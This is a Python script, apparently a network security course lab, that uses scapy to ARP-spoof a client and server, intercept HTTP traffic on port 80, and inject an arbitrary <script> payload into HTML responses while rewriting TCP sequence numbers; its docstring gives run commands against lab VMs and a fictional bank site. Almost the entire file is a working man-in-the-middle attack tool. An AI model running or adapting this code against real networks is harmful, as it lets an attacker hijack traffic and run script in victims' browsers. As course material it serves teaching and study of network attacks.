# largely copied from https://0x00sec.org/t/quick-n-dirty-arp-spoofing-in-python/487
import argparse
import os
import re
import sys
import threading
import time

from scapy.all import *
from scapy.layers import http


FIN  = 0b000001
SYN  = 0b000010
PSH  = 0b001000
ACK  = 0b010000

SYN_ACK = SYN | ACK
FIN_ACK = FIN | ACK
PSH_ACK = PSH | ACK

# From Wireshark
TCP_MSS = 1460

# TODO: Calculate dynamically, instead of hardcoding from Wireshark
TCP_OPTIONS_SIZE_BYTES = 12


def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="network interface to bind to", required=True)
    parser.add_argument("-ip1", "--clientIP", help="IP of the client", required=True)
    parser.add_argument("-ip2", "--serverIP", help="IP of the server", required=True)
    parser.add_argument("-s", "--script", help="script to inject", required=True)
    parser.add_argument("-v", "--verbosity", help="verbosity level (0-2)", default=0, type=int)
    return parser.parse_args()


def debug(s):
    global verbosity
    if verbosity >= 1:
        print('# {0}'.format(s))
        sys.stdout.flush()


def mac(ip):
    resp = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=ip))
    return resp[0][0][1].hwsrc


def spoof_thread(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC, interval = 3):
    while True:
        spoof(serverIP, attackerMAC, clientIP, clientMAC)      # Spoof client ARP table
        spoof(clientIP, attackerMAC, serverIP, serverMAC)  # Spoof httpServer ARP table
        time.sleep(interval)


def spoof(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"spoofing {dstIP}'s ARP table: setting {srcIP} to {srcMAC}")
    send(ARP(pdst=dstIP, hwdst=dstMAC, psrc=srcIP, hwsrc=srcMAC, op=2))


def restore(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"restoring ARP table for {dstIP}")
    send(ARP(pdst=dstIP, hwdst=dstMAC, psrc=srcIP, hwsrc=srcMAC, op=2))


# TODO: handle intercepted packets
# NOTE: this intercepts all packets that are sent AND received by the attacker, so 
# you will want to filter out packets that you do not intend to intercept and forward
def interceptor(packet):
    """ Super flaky for multiple TCP connections, I'm surpised this works at all... """

    global clientIP, serverIP, attackerMAC

    if packet[Ether].dst != attackerMAC:
        return
    
    original_seq = packet[TCP].seq
    original_ack = packet[TCP].ack
    src = 'Client' if packet[IP].src == clientIP else 'Server'
    print('#\n# ', src,' sent: ', packet.summary(), ' > seq: ', original_seq, ', ack: ', original_ack)
    
    global arp_table

    # Not using attackerMAC breaks things...
    # packet[Ether].src = arp_table[packet[IP].src]
    packet[Ether].src = attackerMAC
    packet[Ether].dst = arp_table[packet[IP].dst]

    del packet[IP].len
    del packet[IP].chksum
    del packet[TCP].chksum
    del packet.chksum

    session_id = (
        packet[IP].src, 
        packet[IP].dst, 
        packet[TCP].sport, 
        packet[TCP].dport
    ) if packet[IP].src == clientIP else (
        packet[IP].dst, 
        packet[IP].src, 
        packet[TCP].dport, 
        packet[TCP].sport
    )

    global active_sessions

    # print('# \t[BEFORE] TCP Sessions: ', active_sessions)
    print('# \t[BEFORE] TCP Sessions: ', active_sessions[session_id]['HTTP_STREAMS'] if session_id in active_sessions else active_sessions)

    if session_id not in active_sessions:
        active_sessions[session_id] = {
            'MSS': TCP_MSS,           # 
            'EXTRA': 0,            # Offsets SEQ and ACKS after injecting payload
            'FIN_ACK_SEQ': -1,     # First FIN+ACK in TCP close
            'SYN_SEQ': -1,         # First SYN in TCP handshake
            'OVERFLOW': None,      
            'HTTP_STREAMS': {}
        }
        for o in packet[TCP].options:
            if o[0] == 'MSS':
                active_sessions[session_id]['MSS'] = o[1]

    if packet[IP].src == clientIP:
        if packet[TCP].flags.value & SYN:
            active_sessions[session_id]['SYN_SEQ'] = packet[TCP].seq
        elif packet.haslayer(http.HTTPRequest):
            active_sessions[session_id]['HTTP_STREAMS'].update({
                packet[TCP].seq + len(packet[TCP].payload): {
                    'COUNT': 0
                }
            })
            original_ack = packet[TCP].ack
            adjusted_ack = max(original_ack - active_sessions[session_id]['EXTRA'], 0)
            packet[TCP].ack = adjusted_ack
        elif packet[TCP].flags.value == ACK and active_sessions[session_id]['FIN_ACK_SEQ'] == -1:
            if packet[TCP].seq in active_sessions[session_id]['HTTP_STREAMS']:
                active_sessions[session_id]['HTTP_STREAMS'][packet[TCP].seq]['COUNT'] -= 1
                if not active_sessions[session_id]['HTTP_STREAMS'][packet[TCP].seq]['COUNT']:
                    original_ack = packet[TCP].ack
                    adjusted_ack = max(original_ack - active_sessions[session_id]['EXTRA'], 0)
                    packet[TCP].ack = adjusted_ack
        elif packet[TCP].flags.value == FIN_ACK:
            active_sessions[session_id]['FIN_ACK_SEQ'] = packet[TCP].seq
            original_ack = packet[TCP].ack
            adjusted_ack = max(original_ack - active_sessions[session_id]['EXTRA'], 0)
            packet[TCP].ack = adjusted_ack
        elif packet[TCP].flags.value == ACK and active_sessions[session_id]['FIN_ACK_SEQ'] != -1:
            original_ack = packet[TCP].ack
            adjusted_ack = max(original_ack - active_sessions[session_id]['EXTRA'], 0)
            packet[TCP].ack = adjusted_ack
            del active_sessions[session_id]

    elif packet[IP].src == serverIP:

        if packet[TCP].ack in active_sessions[session_id]['HTTP_STREAMS']:
            packet[TCP].seq += active_sessions[session_id]['EXTRA']
        
        if packet.haslayer(http.HTTP):

            global search_html, search_body, search_payload, payload, payload_size

            raw_load = packet[Raw].load
            
            if search_html.search(raw_load):
                size = int(packet[http.HTTPResponse].Content_Length)
                new_size = size + payload_size
                packet[http.HTTPResponse].Content_Length = str(new_size)
                active_sessions[session_id]['EXTRA'] += len(str(new_size)) - len(str(new_size))
            
            if search_body.search(raw_load):

                chunks = raw_load.decode().split('</body>')
                packet[Raw].load = (chunks[0] + payload + '</body>' + chunks[1]).encode()
                new_load_size = len(packet[TCP].payload)
                limit = active_sessions[session_id]['MSS'] - TCP_OPTIONS_SIZE_BYTES
                
                if new_load_size > limit:
                    overflow = new_load_size - limit
                    head = packet[Raw].load[:-overflow]
                    active_sessions[session_id]['OVERFLOW'] = packet[Raw].load[-overflow:]
                    packet[Raw].load = head
                else:
                    active_sessions[session_id]['EXTRA'] += payload_size
                    active_sessions[session_id]['OVERFLOW'] = None
            
            elif active_sessions[session_id]['OVERFLOW'] is not None:

                print(active_sessions[session_id]['OVERFLOW'] + packet[Raw].load)

                packet[Raw].load = active_sessions[session_id]['OVERFLOW'] + packet[Raw].load
                new_load_size = len(packet[TCP].payload)
                limit = active_sessions[session_id]['MSS'] - TCP_OPTIONS_SIZE_BYTES

                if new_load_size > limit:
                    overflow = new_load_size - limit
                    packet[Raw].load = packet[Raw].load[:-overflow]
                    active_sessions[session_id]['OVERFLOW'] = packet[Raw].load[-overflow:]
                else:
                    active_sessions[session_id]['EXTRA'] += payload_size
                    active_sessions[session_id]['OVERFLOW'] = None

            active_sessions[session_id]['HTTP_STREAMS'][packet[TCP].ack]['COUNT'] += 1

        elif packet[TCP].flags.value == FIN_ACK:
            # TODO: Server responds based on the original packets; revert to modified packets.
            packet[TCP].seq += active_sessions[session_id]['EXTRA']
        
    # if packet.haslayer(http.HTTPResponse):
    #     print(packet.show())

    # print('# \t[AFTER] TCP Sessions: ', active_sessions)
    print('# \t[AFTER] TCP Sessions: ', active_sessions[session_id]['HTTP_STREAMS'] if session_id in active_sessions else active_sessions)
    print('# \t[Forward] seq: ', packet[TCP].seq, ', diff: ', packet[TCP].seq - original_seq,' | ack: ', packet[TCP].ack, ', diff: ', packet[TCP].ack - original_ack)

    sendp(packet)


if __name__ == "__main__":
    """
    Basic Usage:

        1. root@attacker:~# python3 shared-with-host/abadia2/NetSec/cp2.1.http.py -i eth0 --clientIP 10.4.22.9 --serverIP 10.4.22.218 --script 'alert("hi")' --verbosity 1
        2. Run curl commands from root@client:~# 


    Testing Tips:

        About every 10 seconds, the Client VM automatically sends an HTTP GET Request to http://www.bankofbailey.com 
        which can interfere with testing, some tips to avoid this:
            1. Run a test immediately after client VM's HTTP GET Request finishes
            2. Run root@client curl immediately after root@attacker script
    

    Logs:
        
        I recommend looking at example runs in cp2.1.http.logs/ to learn how this script works...
    
        1. index.html
            1. root@attacker:~# python3 shared-with-host/abadia2/NetSec/cp2.1.http.py -i eth0 --clientIP 10.4.22.9 --serverIP 10.4.22.218 --script 'alert("hi")' --verbosity 1 > shared-with-host/abadia2/NetSec/cp2.1.http.logs/index.log
            2. root@client:~# curl http://www.bankofbailey.com/index.html
        2. Multiple index.html
            1. root@attacker:~# python3 shared-with-host/abadia2/NetSec/cp2.1.http.py -i eth0 --clientIP 10.4.22.9 --serverIP 10.4.22.218 --script 'alert("hi")' --verbosity 1 > shared-with-host/abadia2/NetSec/cp2.1.http.logs/index-multi.log
            2. root@client:~# curl http://www.bankofbailey.com/index.html http://www.bankofbailey.com/index.html
        3. long.html
            1. root@attacker:~# python3 shared-with-host/abadia2/NetSec/cp2.1.http.py -i eth0 --clientIP 10.4.22.9 --serverIP 10.4.22.218 --script 'alert("hi")' --verbosity 1 > shared-with-host/abadia2/NetSec/cp2.1.http.logs/long.log
            2. root@client:~# curl http://www.bankofbailey.com/long.html
        4. Multiple long.html
            1. root@attacker:~# python3 shared-with-host/abadia2/NetSec/cp2.1.http.py -i eth0 --clientIP 10.4.22.9 --serverIP 10.4.22.218 --script 'alert("hi")' --verbosity 1 > shared-with-host/abadia2/NetSec/cp2.1.http.logs/long-multi.log
            2. root@client:~# curl http://www.bankofbailey.com/long.html http://www.bankofbailey.com/long.html
        5. hard.html
            1. root@attacker:~# python3 shared-with-host/abadia2/NetSec/cp2.1.http.py -i eth0 --clientIP 10.4.22.9 --serverIP 10.4.22.218 --script 'alert("hi")' --verbosity 1 > shared-with-host/abadia2/NetSec/cp2.1.http.logs/hard.log
            2. root@client:~# curl http://www.bankofbailey.com/hard.html
        6. Multiple hard.html
            1. root@attacker:~# python3 shared-with-host/abadia2/NetSec/cp2.1.http.py -i eth0 --clientIP 10.4.22.9 --serverIP 10.4.22.218 --script 'alert("hi")' --verbosity 1 > shared-with-host/abadia2/NetSec/cp2.1.http.logs/hard-multi.log
            2. root@client:~# curl http://www.bankofbailey.com/hard.html http://www.bankofbailey.com/hard.html
    """

    args = parse_arguments()
    verbosity = args.verbosity
    if verbosity < 2:
        conf.verb = 0 # minimize scapy verbosity
    conf.iface = args.interface # set default interface

    clientIP = args.clientIP
    serverIP = args.serverIP
    attackerIP = get_if_addr(args.interface)

    clientMAC = mac(clientIP)
    serverMAC = mac(serverIP)
    attackerMAC = get_if_hwaddr(args.interface)

    arp_table = {
        clientIP: clientMAC, 
        serverIP: serverMAC
    }
    active_sessions = {}

    script = args.script

    payload = f'<script>{script}</script>'
    payload_size = len(payload)
    search_html = re.compile(b'<html>')
    search_body = re.compile(b'</body>')
    search_payload = re.compile(b'<script>{script}</script>')

    # start a new thread to ARP spoof in a loop
    spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC), daemon=True)
    spoof_th.start()

    # start a new thread to prevent from blocking on sniff, which can delay/prevent KeyboardInterrupt
    sniff_th = threading.Thread(
        target=sniff, 
        # Only capture packets where the SOURCE or DESTINATION IP address is clientIP on port 80
        kwargs={'prn':interceptor, 'filter':f"tcp port 80 and ip host {clientIP}"}, 
        daemon=True
    )
    sniff_th.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        restore(clientIP, clientMAC, serverIP, serverMAC)
        restore(serverIP, serverMAC, clientIP, clientMAC)
        sys.exit(1)

    restore(clientIP, clientMAC, serverIP, serverMAC)
    restore(serverIP, serverMAC, clientIP, clientMAC)
